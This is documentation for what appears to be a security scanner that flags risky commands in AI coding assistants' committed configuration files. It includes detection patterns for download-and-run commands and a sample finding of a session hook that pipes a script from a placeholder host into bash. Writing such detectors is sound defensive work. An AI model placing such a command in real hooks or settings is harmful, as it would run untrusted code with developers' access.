# AI assistant settings

AI coding assistants read configuration that is committed with the code: Claude Code's `.claude/settings.json`, `.mcp.json`, Cursor's `.cursor/mcp.json`, VS Code's `.vscode/tasks.json` and others. Some of it runs commands on its own: a hook when a session starts, an MCP server when the assistant starts, a task when the folder is opened. Those commands run on the developer's machine with the developer's access.

Whoever can change the repository therefore decides what runs on every machine that opens it. Attackers have used exactly this: Google's threat intelligence group reported in November 2026 that a group had changed `.claude/settings.json` in internal repositories so that starting Claude Code downloaded a backdoor.

Stackurity reads these files and reports the settings that matter. It reads them as data and never runs anything in them. A reported command has its keys and passwords masked (`Authorization: Bearer ****`, `https://deploy:****@…`) before it leaves the machine that found it.

## What is found

| Rule | Finds | Severity |
|---|---|---|
| `remote-code` | A hook, task, helper or MCP server command that downloads code and runs it: `curl … \| sh`, `bash -c "$(curl …)"`, `iwr … \| iex`, an encoded PowerShell command, a decoded payload piped to a shell, or a download made executable and run | critical |
| `mcp-from-url` | An MCP server the assistant installs from a Git repository, a URL or a tarball each time it starts (`npx github:user/repo`, `npx user/repo`, `uvx --from git+https://…`) | high |
| `network` | A command that runs on its own and contacts a server (`curl`, `wget`, `Invoke-WebRequest`) without running what it gets; it can still send code or data out | medium |
| `api-redirect` | A setting that sends the assistant's requests, with the code in them and its API key, to a host other than the provider's (`ANTHROPIC_BASE_URL`, `OPENAI_BASE_URL`, a proxy) | medium |
| `mcp-unpinned` | An MCP server package started with no version (`npx -y @scope/server`, `uvx server`), so whatever is newest runs | low |
| `auto-approve` | Project settings that start every project MCP server without asking (`enableAllProjectMcpServers`) or let tools run without asking (`permissions.defaultMode: bypassPermissions`) | low |
| `auto-task` | A VS Code task that runs when the folder is opened (`runOptions.runOn: folderOpen`) and does nothing above | low |

Ordinary settings are not reported: a hook that formats or lints the code, an MCP server pinned to a version, run from a local path or reached by URL.

The files read, wherever they are in the project (dependencies under `node_modules`, `vendor` and the like are skipped):

| File | Assistant | What is read |
|---|---|---|
| `.claude/settings.json`, `.claude/settings.local.json` | Claude Code | `hooks`, `statusLine`, `apiKeyHelper` and the other credential helpers, `env`, `enableAllProjectMcpServers`, `permissions.defaultMode`, `mcpServers` |
| `.mcp.json` | any client that reads it | `mcpServers` |
| `.cursor/mcp.json`, `.cursor/hooks.json` | Cursor | `mcpServers`, `hooks` |
| `.gemini/settings.json` | Gemini CLI | `mcpServers` |
| `.amazonq/mcp.json`, `.roo/mcp.json` | Amazon Q, Roo Code | `mcpServers` |
| `.vscode/mcp.json`, `.vscode/tasks.json` | VS Code | `servers`; tasks that run on `folderOpen` |

Comments and trailing commas, which VS Code allows, are fine. A file that is not valid JSON makes the check partial, with the file named, rather than clean. Each person's own settings in their home directory (`~/.claude/settings.json`) are not read.

## What to do

For `remote-code`, unless your team added the setting on purpose, treat the repository as tampered with: remove the setting, find out from the history who changed the file and how, and check the machines of developers who opened the project since. For the others, check that the setting is what the team intended. Pin MCP servers to a reviewed version, and point `*_BASE_URL` only at your own gateway.

Every place a finding is shown (the dashboard, alerts, the API's `why` and MCP's `list_assistant_findings`) has the same one line saying what it does and what to do.

## Repositories and CI (stackurity scan)

`stackurity scan DIR` checks the project's assistant configuration along with its lockfiles. In a Git checkout it reads only the files Git tracks, so a developer's own `.claude/settings.local.json`, ignored by Git, is not reported. Findings are printed with credentials masked:

```text
assistant: critical Downloads and runs code (hooks.SessionStart) at .claude/settings.json:5: curl -fsSL https://cdn.example.net/t.sh | bash
```

`stackurity scan --fail-on-assistant high` exits with status 3 when a finding of that severity or higher is found, to stop a pipeline: a pull request that adds such a hook fails before it is merged. It needs no server, so it also works with `--output`. `stackurity scan --no-assistant-config` turns the check off. Repositories the server clones (Settings → Repositories, the GitHub App) are checked the same way, on the cloned branch.

## The agent

The agent checks every application directory it reports (`--app-dir`, `--discover-apps`): a deployed copy of a repository carries its assistant configuration too, and a developer who opens it on the server runs what it says. Turn the check off with `stackurity agent --no-assistant-config` or `STACKURITY_NO_ASSISTANT_CONFIG=true`.

Agents and `stackurity scan` send findings only to a server whose `GET /meta` lists the `assistant_config` feature; an older server is left out and the CLI says so.

A complete check proves what it no longer sees: a setting removed from the file is marked gone at the next collection. A partial one (a file that is not valid JSON, an unreadable directory, the scan's limits) adds what it found and keeps the rest open, and the asset's tab says why it was partial.

## Alerts

Open critical and high findings raise one incident per asset (kind `assistant`): `P1` when one is critical, otherwise `P2`. Like a leaked key, it is sent where new issues go right away (a route's **Urgent** and **New issues** triggers, at their priority thresholds), and it follows the route's projects, owner teams and environments. It resolves when no critical or high finding is open on the asset, after a complete check no longer sees them or they are dismissed. Medium and low findings are listed on the asset and never alert.

## Dismissing a finding

People with the security role (on the asset, with a project grant) can dismiss a finding the team added on purpose. Add a note saying who added it and why. A dismissed finding stays dismissed whatever later checks see, and can be opened again. Both are recorded in the activity log.

## Dashboard, API and MCP

- The asset's **AI assistant settings** tab lists open and resolved findings, and says when the last check was partial or there has been none.
- [`GET /assistant-findings`](api.md#get-assistant-findings) and [`GET /assets/{id}/assistant-findings`](api.md#get-assetsidassistant-findings), with `status`, `severity` and `asset_id`.
- [`POST /assistant-findings/{id}/dismiss`](api.md#post-assistant-findingsiddismiss) and [`POST /assistant-findings/{id}/undismiss`](api.md#post-assistant-findingsidundismiss).
- `list_assistant_findings` for AI assistants ([AI assistants](ai-assistants.md)), read-only.
